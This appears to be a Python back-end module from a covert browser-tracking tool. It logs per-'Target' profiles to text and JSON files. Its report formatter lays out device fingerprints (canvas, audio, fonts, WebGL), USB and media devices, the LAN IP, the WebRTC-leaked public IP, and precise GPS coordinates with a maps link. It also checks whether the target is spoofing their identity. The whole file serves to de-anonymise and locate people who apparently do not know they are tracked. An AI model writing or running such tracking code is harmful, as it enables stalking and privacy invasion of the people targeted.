import json
from datetime import datetime
from config import config
import shutil
from pathlib import Path

TARGETS_LOG_DIR = config.LOG_DIR / "targets"
TARGETS_DATA_DIR = config.DATA_DIR / "targets"

TARGETS_LOG_DIR.mkdir(parents=True, exist_ok=True)
TARGETS_DATA_DIR.mkdir(parents=True, exist_ok=True)

def log_to_file_rotating(filename: str, content: str):
    filepath = config.LOG_DIR / filename
    filepath.parent.mkdir(parents=True, exist_ok=True)
    
    if filepath.exists() and filepath.stat().st_size >= config.MAX_LOG_SIZE:
        for i in range(config.BACKUP_COUNT - 1, 0, -1):
            src = config.LOG_DIR / f"{filename}.{i}"
            dst = config.LOG_DIR / f"{filename}.{i+1}"
            if src.exists():
                shutil.move(str(src), str(dst))
        shutil.move(str(filepath), str(config.LOG_DIR / f"{filename}.1"))
        
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(content + "\n")
        f.flush() # সাথে সাথে ডিস্কে সেভ করবে

def save_user_profile(user_id: str, formatted_content: str, raw_json_data: dict):
    user_txt_path = TARGETS_LOG_DIR / f"{user_id}.txt"
    user_txt_path.parent.mkdir(parents=True, exist_ok=True)
    with open(user_txt_path, "a", encoding="utf-8") as f:
        f.write(formatted_content + "\n\n")
        f.flush() # সাথে সাথে ডিস্কে সেভ করবে

    user_json_path = TARGETS_DATA_DIR / f"{user_id}.json"
    user_json_path.parent.mkdir(parents=True, exist_ok=True)
    with open(user_json_path, "w", encoding="utf-8") as f:
        json.dump(raw_json_data, f, indent=2, ensure_ascii=False)
        f.flush()

def save_orientation_json(data: dict):
    filepath = config.DATA_DIR / "live_orientation.json"
    filepath.parent.mkdir(parents=True, exist_ok=True)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(data, f)
        f.flush()

def format_human_readable(data: dict, user_id: str = "anonymous") -> str:
    lines = ["="*70, f"🆔 Target: {user_id}", f"📅 Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "-"*40]

    # 1. LIE / SPOOFING DETECTION
    if data.get("lieDetection"):
        ld = data["lieDetection"]
        if ld.get("isSpoofed"):
            lines.append("🚨 SPOOFING / LIES DETECTED!")
            for lie in ld.get("detectedLies", []):
                lines.append(f"  ⚠️ {lie}")
        else:
            lines.append("✅ IDENTITY INTEGRITY: Clean Client (No Spoofing)")

    # 2. BASIC DEVICE SPECS
    if data.get("deviceInfo"):
        lines.append("\n📱 BASIC DEVICE SPECIFICATIONS")
        for k, v in data["deviceInfo"].items():
            lines.append(f"  {k}: {v}")

    # 3. CPU BENCHMARK
    if data.get("cpuBenchmark"):
        lines.append("\n⚡ CPU BENCHMARK & PERFORMANCE")
        for k, v in data["cpuBenchmark"].items():
            lines.append(f"  {k}: {v}")

    # 4. HARDWARE MEDIA CAPABILITIES
    if data.get("mediaCapabilities"):
        lines.append(f"\n🎬 HARDWARE MEDIA CAPABILITIES (Smooth 4K): {data['mediaCapabilities']}")

    # 5. V8 HEAP
    if data.get("v8MemoryHeap"):
        lines.append(f"\n🧠 V8 JS RAM HEAP LIMIT: {data['v8MemoryHeap']}")

    # 6. INPUT MODES
    if data.get("interactionModes"):
        lines.append(f"\n🖱️ INPUT / ACCESSIBILITY MODE: {data['interactionModes']}")

    # 7. INTL PROFILE
    if data.get("intlSystem"):
        lines.append(f"\n🌍 INTL REGIONAL / LOCALE PROFILE: {data['intlSystem']}")

    # 8. SCREEN GEOMETRY
    if data.get("screenDetails"):
        lines.append(f"\n🖥️ SCREEN ORIENTATION DETAILS: {data['screenDetails']}")

    # 9. NAVIGATION LATENCY
    if data.get("navigationTiming"):
        lines.append(f"\n⏱️ NETWORK HANDSHAKE & DNS LATENCY: {data['navigationTiming']}")

    # 10. BATTERY
    if data.get("batteryInfo"):
        lines.append("\n🔋 BATTERY STATUS")
        for k, v in data["batteryInfo"].items():
            lines.append(f"  {k}: {v}")

    # 11. NETWORK & SPEED
    if data.get("networkInfo"):
        lines.append("\n📶 NETWORK & CONNECTION")
        for k, v in data["networkInfo"].items():
            lines.append(f"  {k}: {v}")

    # 12. CLIENT HINTS
    if data.get("clientHints"):
        lines.append("\n🔬 HIGH-ENTROPY CLIENT HINTS")
        for k, v in data["clientHints"].items():
            lines.append(f"  {k}: {v}")

    # 13. DISPLAY PROFILE
    if data.get("displayIntel"):
        lines.append("\n🎨 DISPLAY COLOR GAMUT & PROFILE")
        for k, v in data["displayIntel"].items():
            lines.append(f"  {k}: {v}")

    # 14. AUDIO STACK
    if data.get("audioContextIntel"):
        lines.append(f"\n🔊 AUDIO HARDWARE STACK: {data['audioContextIntel']}")

    # 15. STORAGE & PERMISSIONS
    if data.get("storageIntel"):
        lines.append(f"\n💾 STORAGE CAPACITY: {data['storageIntel']}")
    if data.get("permissionIntel"):
        lines.append(f"🔒 BROWSER PERMISSIONS STATE: {data['permissionIntel']}")

    # 16. EMOJI SUB-PIXEL
    if data.get("emojiMetrics"):
        lines.append("\n📐 EMOJI SUB-PIXEL METRICS")
        for k, v in data["emojiMetrics"].items():
            lines.append(f"  {k}: {v}")

    # 17. JS MATH QUIRKS
    if data.get("mathQuirks"):
        lines.append(f"\n🔢 JS MATH ENGINE HASH: {data['mathQuirks'].get('precisionHash')}")

    # 18. GRAPHICS
    if data.get("webgpuFingerprint"):
        lines.append(f"\n🎮 WEBGPU: {data['webgpuFingerprint']}")
    if data.get("webglFingerprint"):
        lines.append(f"🎨 WEBGL RENDERER & EXTENSIONS: {data['webglFingerprint']}")

    # 19. GAMEPADS
    if data.get("gamepadIntel") and data["gamepadIntel"].get("connected"):
        lines.append(f"\n🕹️ CONNECTED GAMEPADS: {data['gamepadIntel']}")

    # 20. SYSTEM VOICES
    if data.get("systemVoices") and len(data["systemVoices"]) > 0:
        lines.append("\n🗣️ SYSTEM TTS VOICES")
        for voice in data["systemVoices"][:6]:
            lines.append(f"  - {voice}")

    # 21. FINGERPRINTS
    if data.get("canvasFingerprint"):
        lines.append(f"\n🖌️ CANVAS IDENTIFIER: {data['canvasFingerprint']}")
    if data.get("audioFingerprint"):
        lines.append(f"🔊 AUDIO SIGNATURE: {str(data['audioFingerprint'])[:60]}...")
    if data.get("fontsSignature"):
        lines.append(f"🔤 FONTS SIGNATURE: {str(data['fontsSignature'])[:60]}...")
    if data.get("clientRects"):
        lines.append(f"📐 CLIENT RECTS: {data['clientRects']}")

    # 22. PERIPHERALS
    if data.get("mediaDevices"):
        lines.append("\n🎥 CONNECTED MEDIA DEVICES")
        for d in data["mediaDevices"][:5]:
            lines.append(f"  - {d.get('kind')} | {d.get('label')}")
    if data.get("usbDevices") and len(data["usbDevices"]) > 0:
        lines.append("\n🔌 USB DEVICES")
        for d in data["usbDevices"]:
            lines.append(f"  - {d.get('productName')} ({d.get('manufacturerName')})")

    # 23. IP & GEO
    if data.get("ipInfo"):
        lines.append("\n🌐 NETWORK & GEO-LOCATION")
        for k, v in data["ipInfo"].items():
            lines.append(f"  {k}: {v}")
    if data.get("localIP"):
        lines.append(f"  Local LAN IP: {data['localIP']}")
    if data.get("webrtcPublicIP"):
        lines.append(f"  WebRTC STUN Leak IP: {data['webrtcPublicIP']}")

    # 24. GPS
    if data.get("gps"):
        g = data["gps"]
        lines.append("\n📍 PRECISE GPS COORDINATES")
        lines.append(f"  Latitude: {g.get('latitude')}")
        lines.append(f"  Longitude: {g.get('longitude')}")
        if g.get('latitude') and g.get('longitude'):
            lines.append(f"  Google Maps: https://www.google.com/maps?q={g['latitude']},{g['longitude']}")
        if g.get('accuracy'):
            lines.append(f"  Accuracy: {g.get('accuracy')}m")
        if g.get('altitude'):
            lines.append(f"  Altitude: {g.get('altitude')}m")
        if g.get('speed'):
            lines.append(f"  Speed: {g.get('speed')} m/s")

    lines.append("="*70)
    return "\n".join(lines)